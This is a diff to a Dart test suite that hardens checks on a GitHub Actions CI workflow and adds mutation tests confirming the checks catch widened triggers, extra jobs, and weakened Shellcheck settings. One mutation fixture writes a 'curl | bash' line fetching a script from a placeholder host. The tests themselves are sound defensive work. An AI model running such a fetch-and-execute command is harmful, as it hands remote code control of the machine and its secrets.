@@ -93,6 +93,95 @@ void _expectRunsExactly(WorkflowStep? step, String command, String why) {
   );
 }
 
+/// Everything #18's criteria depend on in ci.yml. A function, not an
+/// inline test, so the negative battery below can run it against a
+/// mutated file — the release side had that and this did not (#170).
+void _assertCiShape(Workflow ci) {
+  expect(ci.problem, isNull);
+  // Equality, not containsAll. `containsAll` is one-directional: it says
+  // the expected triggers are present and nothing about what was added
+  // beside them, so `pull_request_target` — which runs fork code in the
+  // BASE repository's context, with its secrets — was green (#170).
+  // release.yml already asserted its trigger by equality, so the right
+  // form was available and the weaker one was chosen here.
+  expect(
+    ci.triggers..sort(),
+    ['pull_request', 'workflow_call'],
+    reason:
+        'ci-shape: exactly these triggers. pull_request_target would run '
+        'a fork\'s code against this repository\'s secrets',
+  );
+  expect(ci.jobs.map((j) => j.name).toList(), [
+    'gate',
+  ], reason: 'ci-shape: one job — a second job can run anything');
+  for (final job in ci.jobs) {
+    expect(
+      job.continueOnError,
+      isFalse,
+      reason:
+          'ci-shape: job `${job.name}` carries `continue-on-error`, so '
+          'its failure would not block the merge it exists to block',
+    );
+  }
+
+  final gate = ci.job('gate');
+  expect(gate, isNotNull, reason: 'ci-shape: no gate job');
+  final ids = gate!.steps.map((s) => s.id).toList();
+  expect(ids.first, 'checkout');
+  // Never compared to anything: `./does-not-exist` makes Shellcheck scan
+  // nothing and still pass, and `severity: error` silently stops it
+  // reporting warnings (#170).
+  final shellcheck = gate.stepById('shellcheck')!;
+  expect(shellcheck.uses, 'ludeeus/action-shellcheck@2.0.0');
+  expect(
+    shellcheck.with_['scandir'],
+    './tools',
+    reason: 'ci-shape: Shellcheck must scan the scripts directory',
+  );
+  expect(
+    shellcheck.with_['severity'],
+    'warning',
+    reason: 'ci-shape: raising the severity floor hides findings',
+  );
+  expect(
+    ids.indexOf('shellcheck'),
+    1,
+    reason:
+        'ci-shape: Shellcheck runs before the toolchain — it takes '
+        'seconds and a shell error should not wait for Gradle',
+  );
+
+  _expectRunsExactly(
+    gate.stepById('deps'),
+    'flutter pub get --enforce-lockfile',
+    'ci-shape: dependencies must resolve against the lockfile',
+  );
+  _expectRunsExactly(
+    gate.stepById('guards'),
+    'flutter test --no-pub --tags guard',
+    'ci-shape: the invariant guards must be their own step',
+  );
+  _expectRunsExactly(
+    gate.stepById('gate'),
+    'tools/gate.sh',
+    'ci-shape: the gate step must run the same script as local',
+  );
+
+  for (final id in const ['deps', 'guards', 'gate']) {
+    expect(
+      gate.stepById(id)!.isUnconditional,
+      isTrue,
+      reason: 'ci-shape: `$id` must not be skippable',
+    );
+  }
+
+  final artifact = gate.steps.firstWhere(
+    (s) => (s.uses ?? '').contains('upload-artifact'),
+  );
+  expect(artifact.with_['retention-days'], '7');
+  expect(artifact.with_['if-no-files-found'], 'error');
+}
+
 /// A step that hands the service-account key to a Play upload action.
 /// Matched on the action's repository path rather than a substring of the
 /// whole `uses:`, so a lookalike under another owner is not this (#169).
@@ -117,6 +206,14 @@ void _assertReleaseShape(Workflow wf) {
     wf.pushBranches,
     isEmpty,
     reason: 'release-shape: a branch filter would ship on every merge',
+  );
+
+  expect(
+    wf.jobs.map((j) => j.name).toList(),
+    ['gate', 'ship', 'report-gate-failure'],
+    reason:
+        'release-shape: exactly these three jobs — an added job runs with '
+        'the same secrets and nothing above constrains it',
   );
 
   final gate = wf.job('gate');
@@ -353,54 +450,45 @@ void main() {
       // written for release.yml only, so changing the artifact retention,
       // dropping `--enforce-lockfile`, or deleting the guards step were all
       // green (#165).
-      final ci = Workflow.parse(
-        '.github/workflows/ci.yml',
-        readFile('.github/workflows/ci.yml'),
+      _assertCiShape(
+        Workflow.parse(
+          '.github/workflows/ci.yml',
+          readFile('.github/workflows/ci.yml'),
+        ),
       );
-      expect(ci.problem, isNull);
-      expect(ci.triggers, containsAll(['pull_request', 'workflow_call']));
+    });
 
-      final gate = ci.job('gate');
-      expect(gate, isNotNull, reason: 'ci-shape: no gate job');
-      final ids = gate!.steps.map((s) => s.id).toList();
-      expect(ids.first, 'checkout');
-      expect(
-        ids.indexOf('shellcheck'),
-        1,
-        reason:
-            'ci-shape: Shellcheck runs before the toolchain — it takes '
-            'seconds and a shell error should not wait for Gradle',
-      );
-
-      _expectRunsExactly(
-        gate.stepById('deps'),
-        'flutter pub get --enforce-lockfile',
-        'ci-shape: dependencies must resolve against the lockfile',
-      );
-      _expectRunsExactly(
-        gate.stepById('guards'),
-        'flutter test --no-pub --tags guard',
-        'ci-shape: the invariant guards must be their own step',
-      );
-      _expectRunsExactly(
-        gate.stepById('gate'),
-        'tools/gate.sh',
-        'ci-shape: the gate step must run the same script as local',
-      );
-
-      for (final id in const ['deps', 'guards', 'gate']) {
+    test('the ci-shape rule catches each way the gate can be widened', () {
+      final text = readFile('.github/workflows/ci.yml');
+      final mutations = <String, String Function(String)>{
+        'pull_request_target added': (t) => t.replaceFirst(
+          'on:\n  pull_request:\n',
+          'on:\n  pull_request:\n  pull_request_target:\n',
+        ),
+        'a second job that runs anything': (t) =>
+            '$t'
+            '  extra:\n'
+            '    runs-on: ubuntu-latest\n'
+            '    steps:\n'
+            '      - run: curl -sSL https://example.test/x | bash\n',
+        'continue-on-error on the gate job': (t) => t.replaceFirst(
+          '  gate:\n',
+          '  gate:\n    continue-on-error: true\n',
+        ),
+        'shellcheck scans nothing': (t) =>
+            t.replaceFirst('scandir: ./tools', 'scandir: ./does-not-exist'),
+        'shellcheck severity raised past warnings': (t) =>
+            t.replaceFirst('severity: warning', 'severity: error'),
+      };
+      mutations.forEach((why, mutate) {
+        final mutated = mutate(text);
+        expect(mutated, isNot(text), reason: 'sanity: "$why" changed nothing');
         expect(
-          gate.stepById(id)!.isUnconditional,
-          isTrue,
-          reason: 'ci-shape: `$id` must not be skippable',
+          () => _assertCiShape(Workflow.parse('ci.yml', mutated)),
+          throwsA(isA<TestFailure>()),
+          reason: 'ci-shape-negative: "$why" was not caught',
         );
-      }
-
-      final artifact = gate.steps.firstWhere(
-        (s) => (s.uses ?? '').contains('upload-artifact'),
-      );
-      expect(artifact.with_['retention-days'], '7');
-      expect(artifact.with_['if-no-files-found'], 'error');
+      });
     });
 
     test('release.yml keeps the structure its criteria depend on', () {
